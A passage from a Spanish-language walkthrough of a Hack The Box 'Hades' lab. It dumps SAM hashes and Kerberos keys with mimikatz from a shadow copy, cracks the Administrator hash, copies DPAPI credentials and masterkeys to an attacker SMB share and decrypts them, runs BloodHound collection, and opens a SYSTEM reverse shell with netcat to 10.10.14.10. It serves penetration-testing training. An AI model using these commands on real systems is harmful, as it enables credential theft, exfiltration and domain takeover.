+         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+         Originating Machine: dev.htb.local
+         Service Machine: dev.htb.local
+         Provider: 'Microsoft Software Shadow Copy provider 1.0'
+         Type: ClientAccessible
+         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential  
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para hacerlo mas accesible crearemos un <code class="language-plaintext highlighter-rouge">link</code> de la ruta con la copia para poder <code class="language-plaintext highlighter-rouge">acceder</code> a ella desde el directorio <code class="language-plaintext highlighter-rouge">C:\VSS</code> que es un nombre un poco mas corto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">cmd </span><span class="p">/c mklink /d C:\VSS \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\  
+symbolic link created for C:\VSS <<===>> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usaremos de nuevo <code class="language-plaintext highlighter-rouge">mimikatz</code> que subimos de antes para dumpear la <code class="language-plaintext highlighter-rouge">sam</code> pero esta vez de la <code class="language-plaintext highlighter-rouge">copia</code>, para eso le pasaremos la ruta absoluta del system y de la sam</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\mimikatz.exe </span><span class="az">"lsadump::sam /system:C:\VSS\Windows\System32\config\SYSTEM /sam:C:\VSS\Windows\System32\config\SAM" </span><span class="p">exit  
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::sam /system:C:\VSS\Windows\System32\config\SYSTEM /sam:C:\VSS\Windows\System32\config\SAM
+Domain : DEV
+SysKey : e4b2298c95677ce18cd2198b9a36c7df
+Local SID : S-1-5-21-4124311166-4116374192-336467615
+
+SAMKey : bb3dbea7ca8bea043c6523bf5d915ae9
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: de53e322ea95ac2723a2e3e149874aac
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : d9557883adf1e351ab19e287ce268464
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DEV.HTB.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 977755e7a9132c495b90fe59cf5471cd1187b9dab491dac0cb6d02bcc5e30740
+      aes128_hmac       (4096) : e56a6fc47b432e347ad3d918056626fd
+      des_cbc_md5       (4096) : 074aae9e5df751f1
+    OldCredentials
+      aes256_hmac       (4096) : 9d211ec8e9afdb2bd168120abc6a97375b3aa14826b6b512236c16cc361cd290
+      aes128_hmac       (4096) : 99caad607311ade6c51edf9bf0afdd08
+      des_cbc_md5       (4096) : 547afdf27c165e3b
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : DEV.HTB.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : 074aae9e5df751f1
+    OldCredentials
+      des_cbc_md5       : 547afdf27c165e3b
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+
+mimikatz(commandline) # exit
+Bye!
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos ver el hash <code class="language-plaintext highlighter-rouge">NT</code> de Administrator que es diferente al que teniamos, con <code class="language-plaintext highlighter-rouge">john</code> al aplicar fuerza bruta logramos obtener la <code class="language-plaintext highlighter-rouge">contraseña</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=NT  
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 XOP 4x2])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">./*40ra26AZ</span><span class="p">      (</span><span class="am">?</span><span class="p">)
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Listando las <code class="language-plaintext highlighter-rouge">credenciales</code> en el directorio de <code class="language-plaintext highlighter-rouge">Administrator</code> logramos encontrar 2</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">dir </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials </span><span class="c1">-force</span><span class="p">  
+
+    Directory: C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a-hs-         9/9/2019   3:08 AM            474 1A2572C793495F694F64823A392D4718
+-a-hs-         9/9/2019   3:07 AM            474 4A2EEB30EFC7958491B6578D9948EC7F
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para decifrar las credenciales <code class="language-plaintext highlighter-rouge">dpapi</code> necesitaremos descargar las <code class="language-plaintext highlighter-rouge">masterkeys</code> que se encuentran en <code class="language-plaintext highlighter-rouge">Protect</code> dentro de la carpeta que tiene el nombre del <code class="language-plaintext highlighter-rouge">SID</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">dir </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect  
+
+    Directory: C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d---s-         9/8/2019  12:44 PM                S-1-5-21-4124311166-4116374192-336467615-500
+
+PS C:\Users\Administrator\Documents> </span><span class="am">dir </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500 </span><span class="c1">-force</span><span class="p">  
+
+    Directory: C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a-hs-         9/9/2019   3:07 AM            468 87790867-a883-4a2d-a467-019c315e1104
+-a-hs-         9/8/2019  12:44 PM            468 dc6059f1-5ba2-4186-871a-0ff4055a6875
+-a-hs-         9/9/2019   3:07 AM             24 Preferred
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos de nuevo un servicio <code class="language-plaintext highlighter-rouge">smb</code> para recibir todos esos <code class="language-plaintext highlighter-rouge">archivos</code> de la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora copiamos las credenciales <code class="language-plaintext highlighter-rouge">dpapi</code> y las <code class="language-plaintext highlighter-rouge">masterkeys</code> a el recurso <code class="language-plaintext highlighter-rouge">smb</code> creado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials\1A2572C793495F694F64823A392D4718 \\10.10.14.10\kali\1A2572C793495F694F64823A392D4718
+PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Credentials\4A2EEB30EFC7958491B6578D9948EC7F \\10.10.14.10\kali\4A2EEB30EFC7958491B6578D9948EC7F
+PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\87790867-a883-4a2d-a467-019c315e1104 \\10.10.14.10\kali\87790867-a883-4a2d-a467-019c315e1104  
+PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">C:\VSS\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\dc6059f1-5ba2-4186-871a-0ff4055a6875 \\10.10.14.10\kali\dc6059f1-5ba2-4186-871a-0ff4
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez descargados los archivos para poder <code class="language-plaintext highlighter-rouge">decifrarlas</code> primero copiaremos las <code class="language-plaintext highlighter-rouge">credenciales</code> y las <code class="language-plaintext highlighter-rouge">masterkeys</code> a un <code class="language-plaintext highlighter-rouge">Windows</code> para poder correr el <code class="language-plaintext highlighter-rouge">mimikatz</code></p>
+<a href="/endgames/hades/11.png" target="_blank"><div><p><img src="/endgames/hades/11.png"></p></div></a>
+
+<p class="plain-text">Iniciaremos ingresando la <code class="language-plaintext highlighter-rouge">masterkey</code> indicando el <code class="language-plaintext highlighter-rouge">SID</code> que hemos visto de antes y tambien la <code class="language-plaintext highlighter-rouge">contraseña</code> de Administrator que hemos conseguido y decifrado con john</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mimikatz # dpapi::masterkey /in:87790867-a883-4a2d-a467-019c315e1104 /sid:S-1-5-21-4124311166-4116374192-336467615-500 /password:./*40ra26AZ
+**MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {87790867-a883-4a2d-a467-019c315e1104}
+  dwFlags            : 00000005 - 5
+  dwMasterKeyLen     : 000000b0 - 176
+  dwBackupKeyLen     : 00000090 - 144
+  dwCredHistLen      : 00000014 - 20
+  dwDomainKeyLen     : 00000000 - 0
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : c41ab656df74c2a51cb872fa5a5be7fc
+    rounds           : 00001f40 - 8000
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : bac9efb95aeb3796cabdb684ec758f5d32b0a9c564eb6f32b9a8de9c75d8ac677b6ce2b6da49875e2c04629a23260e7ac849955cc17aed002e3d1a0154ce86cb8faec38312fa7d65472dcdba7e4e79688558f3a185c4f5fbb8e09a24f3b9d48dbbe802eef159ca62a394354b15beb940eadeb014f82a09cb2e92eed7276facbb50c01177f5db0b76ed3f31fb877e3ec5  
+
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 50cbeb0513a21c53150e9b0cad9bd772
+    rounds           : 00001f40 - 8000
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : 8b123f98402a3bc524367f6b00f918ccf767054a961fb96de8be049705d016c86db0323c769623a64140e782c8e85dd101530208d3d169a85b35fd65276689042bbf4ed4e3984171799d97a99ff2bf53f4603593a058f39da49d537041204e58f0dc808efc132085c9f703ae3c6a7aab
+
+[credhist]
+  **CREDHIST INFO**
+    dwVersion        : 00000003 - 3
+    guid             : {26b08a5f-4b2c-420d-9843-d05ea57cd32f}
+
+
+
+[masterkey] with password: ./*40ra26AZ (normal user)
+  key : e0b92cbfbeab126231d979377ffd236b2ebd4b0704e2e9229d3ce82bebd144173b9f7160315d5af62289fae50a1fd465100aaf36748b68557e2b05edc25ac4fe
+  sha1: dacd0e1ccaa03abd1ccb22ce058815624739a607
+
+mimikatz #</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacer esto <code class="language-plaintext highlighter-rouge">mimikatz</code> guardara la <code class="language-plaintext highlighter-rouge">masterkey</code> y la credencial <code class="language-plaintext highlighter-rouge">dpapi</code> en <code class="language-plaintext highlighter-rouge">cache</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mimikatz # dpapi::cache
+
+CREDENTIALS cache
+=================
+SID:S-1-5-21-4124311166-4116374192-336467615-500;GUID:{26b08a5f-4b2c-420d-9843-d05ea57cd32f};MD4:de53e322ea95ac2723a2e3e149874aac;SHA1:7cb14ea6f0ed4e5ed9ac0a6a167f088eeec2e09b;  
+
+MASTERKEYS cache
+================
+GUID:{87790867-a883-4a2d-a467-019c315e1104};KeyHash:dacd0e1ccaa03abd1ccb22ce058815624739a607
+
+DOMAINKEYS cache
+================
+
+mimikatz #</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después simplemente podemos pasarle la <code class="language-plaintext highlighter-rouge">primera</code> de ambas <code class="language-plaintext highlighter-rouge">credenciales</code> <code class="language-plaintext highlighter-rouge">dpapi</code> para decifrarlas, esta tiene como <code class="language-plaintext highlighter-rouge">target</code> la <code class="language-plaintext highlighter-rouge">flag</code> y como contenido su valor</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mimikatz # dpapi::cred /in:1A2572C793495F694F64823A392D4718
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {87790867-a883-4a2d-a467-019c315e1104}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : 70fb047908ba7943f6933f49a289e407b87d8432e85bbe45ad9b91cee513bc9c
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         :
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : 9e73cba5176f1ba8bbd5a999eb9092e9371dfba4195d55d5e30b030e671206cb
+  dwDataLen          : 000000c0 - 192
+  pbData             : b55d72a3e4f00c4b103e5a23e6cb4bc97594204460d87cb7555dc700cd8c304050f0bac19475c4e9b0935d8808d7e6ef67d37d11ac43c6018bc59a8de680548c5e6f5f5344b4a9f9f0ea6fc3d6d847a72fbb97a54845c627e37b7aa368b4d6d24831af7cc2bcec6ac7d376651adb734bf93091eb034722cdd99974da553fa741eb5124394189e6018ad07543f796102adc5e3f81b28082350cab75ca407025a449eafc18c5795fe15e497df6a330ed64ca37f94df1b32dfb592f0562d1fabcce
+  dwSignLen          : 00000040 - 64
+  pbSign             : a0a7a1f7462b93455e6673f33d45742931269a9eb9666515a04852bdfcb78ad570352e10c78805356f8baf0751f33dcfb70b29a9c49eb10ec14121e815381196
+
+Decrypting Credential:
+ * volatile cache: GUID:{87790867-a883-4a2d-a467-019c315e1104};KeyHash:dacd0e1ccaa03abd1ccb22ce058815624739a607
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000b6 - 182
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 09/09/2019 10:08:32 a. m.
+  unkFlagsOrSize : 00000040 - 64
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:target=flag
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : flag
+  CredentialBlob : HADES{V5C_r3ve4L_DPaP1_s3cret5}
+  Attributes     : 0
+
+mimikatz #</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag5">
+<br><h3 class="post-title">Gateway</h3>
+<h4 class="post-title">HADES{From_RBCD_To_p4s5word_v@Ult}</h4><br>
+
+<p class="plain-text">La otra credencial <code class="language-plaintext highlighter-rouge">dpapi</code> nos muestra como username el usuario <code class="language-plaintext highlighter-rouge">test-svc</code> a nivel de dominio y como contenido de la <code class="language-plaintext highlighter-rouge">credencial</code> encontramos su <code class="language-plaintext highlighter-rouge">contraseña</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mimikatz # dpapi::cred /in:4A2EEB30EFC7958491B6578D9948EC7F
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {87790867-a883-4a2d-a467-019c315e1104}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : fdb8e305b9dee0d4731a4e95af29273c2da220f0f7a5d41d83bfd14dff9f8cc5
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         :
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : c79494440e85f96dba9a8244ddef0a399ba44453dcfda0ae2a0e69349c0b0a0f
+  dwDataLen          : 000000c0 - 192
+  pbData             : b207f818a6599b2f7b4cbd9635bfa1658489e4ff501cd14d89187bea2e1ebafb01ce45bbc23100e8d3316c8ba0f02370ac09985027298520434cc9f607c52ce92bae597b54451f7f79b24b9c3184794927cbbccf0babde469ae281481a7e96b19c3131de62a77cb0f95604b02668aa9c54f04714c79843874f9a98131b8f22bfde94cfd011b1f3a56c1bab6e09ee0aa4e452d5b1c751d91659c11a0544cb6923bd9d891b07c432d844810a55a2dc3aa87db3452d2ad679c76532db453937c226  
+  dwSignLen          : 00000040 - 64
+  pbSign             : e59eba5fedeb1dab7d34f4e8392471dfed422e845bee3d5b83994d8c8fd4ce1b84b58550ca7514f28d5115a64bf6c5c830cbb40a5e213a519f829893186edbc0
+
+Decrypting Credential:
+ * volatile cache: GUID:{87790867-a883-4a2d-a467-019c315e1104};KeyHash:dacd0e1ccaa03abd1ccb22ce058815624739a607
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000ba - 186
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 09/09/2019 10:07:12 a. m.
+  unkFlagsOrSize : 00000028 - 40
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:target=web
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : htb.local\test-svc
+  CredentialBlob : T3st-S3v!ce-F0r-Pr0d
+  Attributes     : 0
+
+mimikatz #</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos las <code class="language-plaintext highlighter-rouge">credenciales</code> a nivel de dominio con <code class="language-plaintext highlighter-rouge">crackmapexec</code>, son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dc1.htb.local -u test-svc -p </span><span class="am">'T3st-S3v!ce-F0r-Pr0d'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="ve">[+] </span><span class="p">htb.local\test-svc:T3st-S3v!ce-F0r-Pr0d</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para enumerar privilegios e información del <code class="language-plaintext highlighter-rouge">dominio</code> iniciaremos por subir el modulo <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound.ps1</a> usando la función <code class="language-plaintext highlighter-rouge">upload</code> que viene incluida en <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">SharpHound.ps1
+</span><span class="az">
+Info: Uploading SharpHound.ps1 to C:\Users\Administrator\Documents\SharpHound.ps1  
+</span><span class="sa">
+Data: 1757460 bytes of 1757460 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que las <code class="language-plaintext highlighter-rouge">credenciales</code> tambien podemos usarlas para <code class="language-plaintext highlighter-rouge">ldap</code>, importamos el modulo de <code class="language-plaintext highlighter-rouge">SharpHound</code> y lo invocamos pasandole las credenciales de <code class="language-plaintext highlighter-rouge">test-svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec ldap dc1.htb.local -u test-svc -p </span><span class="am">'T3st-S3v!ce-F0r-Pr0d'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">LDAP        </span><span class="p">dc1.htb.local   389    DC1              </span><span class="ve">[+] </span><span class="p">htb.local\test-svc:T3st-S3v!ce-F0r-Pr0d</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Import-Module </span><span class="p">.\SharpHound.ps1
+PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-Bloodhound </span><span class="c1">-CollectionMethod </span><span class="p">All </span><span class="c1">-Domain </span><span class="p">htb.local </span><span class="c1">-LdapUser </span><span class="az">'test-svc' </span><span class="c1">-LdapPassword </span><span class="az">'T3st-S3v!ce-F0r-Pr0d'</span><span class="p">  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo nos creara un <code class="language-plaintext highlighter-rouge">zip</code> con toda la inforamción del <code class="language-plaintext highlighter-rouge">dominio</code>, podemos simplemente descargarlo con la función <code class="language-plaintext highlighter-rouge">download</code> de <code class="language-plaintext highlighter-rouge">evil-winrm</code> como <code class="language-plaintext highlighter-rouge">BH.zip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\Administrator\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/27/2023   9:06 PM          12157 20230427210646_BloodHound.zip
+-a----        4/27/2023   8:46 PM        1250056 mimikatz.exe
+-a----        4/27/2023   9:03 PM        1318097 SharpHound.ps1
+
+</span><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">download </span><span class="p">.\20230427210646_BloodHound.zip BH.zip  
+</span><span class="az">
+Info: Downloading .\20230427210646_BloodHound.zip to BH.zip
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo subimos a <code class="language-plaintext highlighter-rouge">bloodhound</code> y mirando los controles de objetos del usuario <code class="language-plaintext highlighter-rouge">test-svc</code> encontramos que tiene el privilegio <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el equipo <code class="language-plaintext highlighter-rouge">web.htb.local</code></p>
+<a href="/endgames/hades/13.png" target="_blank"><div><p><img src="/endgames/hades/13.png"></p></div></a>
+
+<p class="plain-text">Para <code class="language-plaintext highlighter-rouge">explotarlo</code> necesitaremos algunas cosas iniciando por los modulos <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> y <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad</a>, además de <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> para solicitar e importar un <code class="language-plaintext highlighter-rouge">ticket</code> al final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">PowerView.ps1
+</span><span class="az">
+Info: Uploading PowerView.ps1 to C:\Users\Administrator\Documents\PowerView.ps1
+</span><span class="sa">
+Data: 1027036 bytes of 1027036 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">Powermad.ps1
+</span><span class="az">
+Info: Uploading Powermad.ps1 to C:\Users\Administrator\Documents\Powermad.ps1  
+</span><span class="sa">
+Data: 180768 bytes of 180768 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">Rubeus.exe
+</span><span class="az">
+Info: Uploading Rubeus.exe to C:\Users\Administrator\Documents\Rubeus.exe
+</span><span class="sa">
+Data: 595968 bytes of 595968 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo la <code class="language-plaintext highlighter-rouge">operacion</code> que necesitamos hacer es necesario ejecutarla como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> asi que subimos un par de <a href="https://github.com/mkellerman/Invoke-CommandAs">modulos</a> y el <code class="language-plaintext highlighter-rouge">netcat.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">Invoke-CommandAs.ps1
+</span><span class="az">
+Info: Uploading Invoke-CommandAs.ps1 to C:\Users\Administrator\Documents\Invoke-CommandAs.ps1
+</span><span class="sa">
+Data: 25480 bytes of 25480 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">Invoke-ScheduledTask.ps1
+</span><span class="az">
+Info: Uploading Invoke-ScheduledTask.ps1 to C:\Users\Administrator\Documents\Invoke-ScheduledTask.ps1  
+</span><span class="sa">
+Data: 13788 bytes of 13788 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="am">upload </span><span class="p">netcat.exe
+</span><span class="az">
+Info: Uploading netcat.exe to C:\Users\Administrator\Documents\netcat.exe
+</span><span class="sa">
+Data: 60360 bytes of 60360 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Importamos ambos <code class="language-plaintext highlighter-rouge">modulos</code> y usando el <code class="language-plaintext highlighter-rouge">netcat</code> nos enviamos una <code class="language-plaintext highlighter-rouge">powershell</code> a nuestro host pero como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> con el parametro <code class="language-plaintext highlighter-rouge">AsSystem</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Import-Module</span><span class="p"> .\Invoke-CommandAs.ps1
+PS C:\Users\Administrator\Documents> </span><span class="am">Import-Module</span><span class="p"> .\Invoke-ScheduledTask.ps1
+PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-CommandAs </span><span class="c1">-ScriptBlock </span><span class="p">{ </span><span class="am">C:\Users\Administrator\Documents\netcat.exe</span><span class="c1"> -e </span><span class="p">powershell.exe 10.10.14.10 443 } </span><span class="c1">-AsSystem</span><span class="p">  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.17
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Deste esta <code class="language-plaintext highlighter-rouge">shell</code> ahora si importamos ambos <code class="language-plaintext highlighter-rouge">modulos</code> que subimos de antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Import-Module </span><span class="p">.\Powermad.ps1
